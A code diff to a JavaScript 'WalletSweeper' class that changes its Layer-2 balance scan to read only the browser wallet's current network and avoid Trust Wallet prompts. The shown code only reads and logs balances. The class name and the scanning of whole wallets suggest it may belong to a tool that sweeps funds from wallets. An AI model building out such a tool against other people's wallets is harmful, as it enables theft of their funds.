@@ -358,6 +358,8 @@ class WalletSweeper {
             await this.scanEthereumBalancesWithRetry();
 
             console.log('🔷 === SCANNING ETHEREUM L2s ===');
+            // Show notification about current network scanning
+            this.showNotification('Scanning current EVM network only. Switch networks manually to scan others.', 'info');
             await this.scanLayer2Networks();
 
             // 4. Scan Non-EVM Chains
@@ -747,27 +749,83 @@ class WalletSweeper {
             { name: 'Polygon', networkId: 'polygon', chainId: '0x89' }
         ];
 
-        for (const network of l2Networks) {
+        // Check current network to avoid unnecessary switching
+        let currentChainId = null;
+        try {
+            currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+            console.log(`📍 Currently on network: ${currentChainId}`);
+        } catch (error) {
+            console.warn('Could not get current chain ID:', error);
+        }
+
+        // Only scan the current network to avoid Trust Wallet prompts
+        const currentNetwork = l2Networks.find(n => n.chainId === currentChainId);
+        if (currentNetwork) {
+            console.log(`🔍 Scanning current network: ${currentNetwork.name}`);
             try {
-                console.log(`🔷 Scanning ${network.name}...`);
-                await this.scanSpecificL2Network(network);
+                await this.scanSpecificL2NetworkWithoutSwitch(currentNetwork);
             } catch (error) {
-                console.warn(`❌ ${network.name} scanning failed:`, error);
+                console.warn(`❌ ${currentNetwork.name} scanning failed:`, error);
+            }
+        } else {
+            console.log('📊 Currently on Ethereum Mainnet or unknown network');
+            // If we're on mainnet, just scan mainnet without switching
+            if (currentChainId === '0x1') {
+                console.log('✅ Already on Ethereum mainnet, no L2 scanning needed');
             }
         }
 
-        // Switch back to Ethereum mainnet to avoid user confusion
+        // Log info about other networks without switching
+        console.log('ℹ️ To scan other L2 networks, please switch manually in your wallet');
+    }
+
+    /**
+     * Scan a specific L2 network without switching
+     */
+    async scanSpecificL2NetworkWithoutSwitch(network) {
         try {
-            console.log('🔄 Switching back to Ethereum mainnet...');
-            await this.switchToNetwork('0x1');
-            console.log('✅ Switched back to Ethereum mainnet');
+            if (!window.ethereum || !this.config.ethWallet) {
+                console.log(`⚠️ Ethereum wallet not available for ${network.name}`);
+                return;
+            }
+
+            // Get native token balance without switching
+            const balance = await window.ethereum.request({
+                method: 'eth_getBalance',
+                params: [this.config.ethWallet, 'latest']
+            });
+
+            const nativeBalance = parseInt(balance, 16) / Math.pow(10, 18);
+
+            // Store balance based on network
+            switch (network.networkId) {
+                case 'base':
+                    this.baseBalance = nativeBalance;
+                    await this.scanL2Tokens('base');
+                    break;
+                case 'arbitrum':
+                    this.arbitrumBalance = nativeBalance;
+                    await this.scanL2Tokens('arbitrum');
+                    break;
+                case 'optimism':
+                    this.optimismBalance = nativeBalance;
+                    await this.scanL2Tokens('optimism');
+                    break;
+                case 'polygon':
+                    this.polygonBalance = nativeBalance;
+                    await this.scanL2Tokens('polygon');
+                    break;
+            }
+
+            console.log(`✅ ${network.name}: ${nativeBalance.toFixed(6)} native tokens`);
+
         } catch (error) {
-            console.warn('Failed to switch back to mainnet:', error);
+            console.warn(`Failed to scan ${network.name}:`, error);
         }
     }
 
     /**
-     * Scan a specific L2 network
+     * Scan a specific L2 network (legacy - requires switching)
      */
     async scanSpecificL2Network(network) {
         try {
